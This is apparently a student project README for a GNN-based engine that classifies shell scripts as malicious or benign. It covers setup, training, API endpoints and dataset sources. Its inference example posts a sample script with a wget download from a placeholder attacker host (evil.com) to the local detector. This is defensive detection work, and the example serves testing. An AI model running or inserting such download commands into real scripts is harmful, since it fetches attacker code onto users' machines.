# SANDIA ML Engine

Machine Learning engine for malware detection using Graph Neural Networks (GNN), BERT, and AWS Bedrock.

## Quick Start

### 1. Setup Environment

```bash
# Create virtual environment
python3 -m venv venv
source venv/bin/activate  # On Mac/Linux

# Install dependencies
pip install -r requirements.txt
```

### 2. Add Your Datasets

Place your shell script samples in:
```
ML_Engine/datasets/raw/
├── malicious/   ← Add 20 malicious .sh files here
└── benign/      ← Add 20 benign .sh files here
```

**Currently have**: 2 samples (test.sh - malicious, env.sh - benign)
**Need**: 18 more malicious + 19 more benign

### 3. Train GNN Model

```bash
# Preprocess datasets (convert scripts to graphs)
python scripts/preprocess_data.py

# Train GNN model
python src/gnn/train.py

# Evaluate model
python src/gnn/evaluate.py
```

### 4. Start ML API Server

```bash
# Start Flask API
python api/server.py

# API will run on http://localhost:5001
```

### 5. Test Inference

```bash
# Test with a sample file
curl -X POST http://localhost:5001/api/ml/gnn/analyze \
  -H "Content-Type: application/json" \
  -d '{"script_content": "#!/bin/bash\nwget http://evil.com/malware"}'
```

## Architecture

### GNN Pipeline
```
Shell Script (.sh)
    ↓
AST Parser (bashlex)
    ↓
Graph Builder (networkx)
    ↓
Feature Extractor (node embeddings)
    ↓
GNN Model (3-layer GCN)
    ↓
Risk Score + Attack Pattern
```

### Directory Structure

- `datasets/` - Training data (you add samples here)
- `src/gnn/` - GNN implementation
- `models/gnn/` - Trained model files
- `api/` - Flask inference server
- `scripts/` - Utility scripts
- `notebooks/` - Jupyter notebooks for experimentation

## API Endpoints

### GNN Analysis
```
POST /api/ml/gnn/analyze
Body: {"script_content": "...bash code..."}
Response: {
  "risk_score": 0.89,
  "is_malicious": true,
  "confidence": 0.92,
  "attack_pattern": "download-execute-cleanup",
  "graph_stats": {...}
}
```

### Model Info
```
GET /api/ml/models/info
Response: {
  "gnn": {"status": "loaded", "accuracy": 0.94},
  "bert": {"status": "not_implemented"},
  "bedrock": {"status": "configured"}
}
```

## Training Configuration

Edit `configs/gnn_config.yaml`:
```yaml
model:
  hidden_channels: 64
  num_layers: 3
  dropout: 0.2

training:
  epochs: 100
  learning_rate: 0.001
  batch_size: 32
```

## Performance Metrics

After training, check `results/experiments/latest/metrics.json`:
- Accuracy
- Precision
- Recall
- F1-Score
- ROC-AUC
- Confusion Matrix

## Dataset Sources

### Malicious Samples
- [MalwareBazaar](https://bazaar.abuse.ch/) - Real malware samples
- [VirusShare](https://virusshare.com/) - Malware repository
- [GitHub malware-samples](https://github.com/topics/malware-samples)

### Benign Samples
- GitHub DevOps scripts
- System utility scripts
- Package installation scripts

## Troubleshooting

### Issue: torch-geometric installation fails
```bash
# Install PyTorch first
pip install torch==2.1.0

# Then install torch-geometric with specific wheels
pip install torch-geometric -f https://data.pyg.org/whl/torch-2.1.0+cpu.html
```

### Issue: bashlex parse error
- bashlex only supports bash syntax
- For POSIX sh scripts, some features may fail
- Fallback to regex-based parsing is implemented

## Developer: Ajay S Patil
## Institution: RV University
## Year: 2024-2025
